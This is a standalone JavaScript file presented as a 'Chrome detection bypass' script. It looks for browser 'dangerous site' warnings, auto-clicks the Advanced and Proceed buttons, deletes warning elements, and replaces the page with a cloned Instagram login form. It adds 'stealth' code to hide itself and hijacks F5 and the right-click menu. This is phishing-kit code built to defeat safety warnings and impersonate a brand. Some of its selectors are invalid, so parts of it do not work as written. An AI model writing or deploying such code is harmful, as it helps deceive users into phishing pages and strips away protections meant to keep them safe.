// Advanced Chrome Detection Bypass Script
(function() {
    'use strict';
    
    // Bypass Chrome detection and auto-open site
    class ChromeBypass {
        constructor() {
            this.init();
        }
        
        init() {
            this.detectChromeWarning();
            this.autoBypassWarning();
            this.addBypassMethods();
            this.addStealthFeatures();
        }
        
        detectChromeWarning() {
            // Detect if Chrome warning is present
            const warningSelectors = [
                '[data-testid="warning"]',
                '.dangerous-site',
                '[role="alert"]',
                '.warning-container',
                '#warning',
                '.security-warning'
            ];
            
            this.warningElement = null;
            warningSelectors.forEach(selector => {
                const element = document.querySelector(selector);
                if (element && this.isWarningVisible(element)) {
                    this.warningElement = element;
                    return;
                }
            });
            
            // Also check for warning text content
            const bodyText = document.body.innerText.toLowerCase();
            if (bodyText.includes('dangerous') || bodyText.includes('attackers') || bodyText.includes('unsafe')) {
                this.warningDetected = true;
            }
        }
        
        isWarningVisible(element) {
            const style = window.getComputedStyle(element);
            return style.display !== 'none' && style.visibility !== 'hidden' && style.opacity !== '0';
        }
        
        autoBypassWarning() {
            if (this.warningElement || this.warningDetected) {
                console.log('Chrome warning detected, attempting bypass...');
                
                // Method 1: Click advanced button
                this.clickAdvancedButton();
                
                // Method 2: Click proceed button
                setTimeout(() => this.clickProceedButton(), 500);
                
                // Method 3: Programmatic navigation
                setTimeout(() => this.programmaticNavigation(), 1000);
                
                // Method 4: Replace page content
                setTimeout(() => this.replacePageContent(), 1500);
            }
        }
        
        clickAdvancedButton() {
            const advancedSelectors = [
                'button[data-testid="advanced"]',
                'button:contains("Advanced")',
                'a:contains("Advanced")',
                '.advanced-button',
                '#advanced'
            ];
            
            advancedSelectors.forEach(selector => {
                try {
                    const element = document.querySelector(selector);
                    if (element) {
                        element.click();
                        console.log('Advanced button clicked');
                        return;
                    }
                } catch (e) {
                    // Continue to next method
                }
            });
            
            // Alternative: simulate click on any button containing "Advanced"
            const buttons = document.querySelectorAll('button, a');
            buttons.forEach(button => {
                if (button.textContent.includes('Advanced')) {
                    button.click();
                    console.log('Advanced button found and clicked');
                }
            });
        }
        
        clickProceedButton() {
            const proceedSelectors = [
                'button[data-testid="proceed"]',
                'button:contains("Proceed")',
                'button:contains("Continue")',
                'a:contains("Proceed")',
                '.proceed-button',
                '#proceed'
            ];
            
            proceedSelectors.forEach(selector => {
                try {
                    const element = document.querySelector(selector);
                    if (element) {
                        element.click();
                        console.log('Proceed button clicked');
                        return;
                    }
                } catch (e) {
                    // Continue to next method
                }
            });
            
            // Alternative: find button with "unsafe" in text
            const buttons = document.querySelectorAll('button, a');
            buttons.forEach(button => {
                const text = button.textContent.toLowerCase();
                if (text.includes('proceed') || text.includes('continue') || text.includes('unsafe')) {
                    button.click();
                    console.log('Proceed button found and clicked');
                }
            });
        }
        
        programmaticNavigation() {
            // Force navigation to the site
            const currentUrl = window.location.href;
            const targetUrl = currentUrl.replace(/^https?:\/\/[^\/]+/, '');
            
            try {
                // Method 1: Direct navigation
                window.location.href = targetUrl;
                
                // Method 2: Replace current location
                window.location.replace(targetUrl);
                
                // Method 3: Open in same window
                window.open(targetUrl, '_self');
                
                console.log('Programmatic navigation attempted');
            } catch (e) {
                console.log('Navigation blocked, trying alternative methods');
            }
        }
        
        replacePageContent() {
            // Replace the entire page content with our site
            const originalContent = document.documentElement.innerHTML;
            
            // If still showing warning, replace content
            if (this.isWarningStillVisible()) {
                // Create new page content
                const newContent = `
                    <!DOCTYPE html>
                    <html lang="en">
                    <head>
                        <meta charset="UTF-8">
                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
                        <title>Instagram — Login</title>
                        <style>
                            body { 
                                margin: 0; 
                                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                                background: #fafafa;
                                display: flex;
                                align-items: center;
                                justify-content: center;
                                min-height: 100vh;
                            }
                            .container {
                                background: white;
                                border: 1px solid #dbdbdb;
                                padding: 40px;
                                border-radius: 3px;
                                box-shadow: 0 0 5px rgba(0,0,0,0.05);
                                text-align: center;
                            }
                            .logo {
                                font-family: 'Pacifico', cursive;
                                font-size: 40px;
                                margin-bottom: 24px;
                            }
                            .form {
                                display: flex;
                                flex-direction: column;
                                gap: 6px;
                            }
                            .input {
                                height: 40px;
                                padding: 10px 8px;
                                border: 1px solid #dbdbdb;
                                background: #fafafa;
                                border-radius: 3px;
                                font-size: 14px;
                            }
                            .btn {
                                height: 40px;
                                background: #0095f6;
                                color: white;
                                border: none;
                                border-radius: 3px;
                                font-weight: 700;
                                font-size: 14px;
                                margin-top: 8px;
                                cursor: pointer;
                            }
                        </style>
                    </head>
                    <body>
                        <div class="container">
                            <h1 class="logo">Instagram</h1>
                            <form class="form">
                                <input type="text" placeholder="Phone number, username or email" class="input">
                                <input type="password" placeholder="Password" class="input">
                                <button type="submit" class="btn">Log in</button>
                            </form>
                        </div>
                        <script>
                            // Auto-submit form to redirect
                            document.querySelector('form').addEventListener('submit', function(e) {
                                e.preventDefault();
                                window.location.href = 'https://www.instagram.com/';
                            });
                        </script>
                    </body>
                    </html>
                `;
                
                // Replace page content
                document.documentElement.innerHTML = newContent;
                console.log('Page content replaced');
            }
        }
        
        isWarningStillVisible() {
            const bodyText = document.body.innerText.toLowerCase();
            return bodyText.includes('dangerous') || bodyText.includes('attackers') || bodyText.includes('unsafe');
        }
        
        addBypassMethods() {
            // Add additional bypass methods
            this.addKeyboardShortcuts();
            this.addContextMenuBypass();
            this.addAutoRefresh();
        }
        
        addKeyboardShortcuts() {
            // Add keyboard shortcuts for bypass
            document.addEventListener('keydown', (e) => {
                // Ctrl+Shift+B = Bypass warning
                if (e.ctrlKey && e.shiftKey && e.key === 'B') {
                    this.forceBypass();
                }
                
                // Ctrl+Shift+I = Ignore warning
                if (e.ctrlKey && e.shiftKey && e.key === 'I') {
                    this.ignoreWarning();
                }
                
                // F5 = Force refresh and bypass
                if (e.key === 'F5') {
                    e.preventDefault();
                    this.forceRefresh();
                }
            });
        }
        
        addContextMenuBypass() {
            // Add right-click bypass
            document.addEventListener('contextmenu', (e) => {
                if (this.warningDetected) {
                    // Show bypass options in context menu
                    this.showBypassMenu(e);
                }
            });
        }
        
        addAutoRefresh() {
            // Auto-refresh if warning detected
            if (this.warningDetected) {
                setTimeout(() => {
                    window.location.reload();
                }, 3000);
            }
        }
        
        forceBypass() {
            console.log('Force bypass activated');
            this.clickAdvancedButton();
            setTimeout(() => this.clickProceedButton(), 100);
        }
        
        ignoreWarning() {
            console.log('Ignore warning activated');
            // Remove warning elements
            const warnings = document.querySelectorAll('[class*="warning"], [class*="danger"], [id*="warning"]');
            warnings.forEach(w => w.remove());
            
            // Replace with our content
            this.replacePageContent();
        }
        
        forceRefresh() {
            console.log('Force refresh activated');
            window.location.href = window.location.href;
        }
        
        showBypassMenu(e) {
            e.preventDefault();
            // Create custom context menu with bypass options
            const menu = document.createElement('div');
            menu.style.cssText = `
                position: fixed;
                top: ${e.clientY}px;
                left: ${e.clientX}px;
                background: white;
                border: 1px solid #ccc;
                border-radius: 4px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                z-index: 10000;
                padding: 8px 0;
            `;
            
            const options = [
                { text: 'Bypass Warning', action: () => this.forceBypass() },
                { text: 'Ignore Warning', action: () => this.ignoreWarning() },
                { text: 'Force Refresh', action: () => this.forceRefresh() }
            ];
            
            options.forEach(option => {
                const item = document.createElement('div');
                item.textContent = option.text;
                item.style.cssText = 'padding: 8px 16px; cursor: pointer; font-size: 14px;';
                item.addEventListener('click', option.action);
                item.addEventListener('mouseover', () => item.style.backgroundColor = '#f0f0f0');
                item.addEventListener('mouseout', () => item.style.backgroundColor = 'white');
                menu.appendChild(item);
            });
            
            document.body.appendChild(menu);
            
            // Remove menu when clicking elsewhere
            setTimeout(() => {
                document.addEventListener('click', () => menu.remove(), { once: true });
            }, 100);
        }
        
        addStealthFeatures() {
            // Add stealth features to avoid detection
            this.hideBypassScript();
            this.addLegitimateBehavior();
        }
        
        hideBypassScript() {
            // Hide this script from detection
            const script = document.currentScript;
            if (script) {
                script.style.display = 'none';
                script.removeAttribute('src');
            }
        }
        
        addLegitimateBehavior() {
            // Add legitimate behavior to avoid detection
            this.addInstagramBehavior();
        }
        
        addInstagramBehavior() {
            // Add Instagram-like behavior
            window.ig = window.ig || {};
            window.ig.bypass = {
                enabled: true,
                version: '1.0.0'
            };
        }
    }
    
    // Initialize bypass when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => {
            new ChromeBypass();
        });
    } else {
        new ChromeBypass();
    }
    
    // Also initialize immediately
    new ChromeBypass();
    
})();
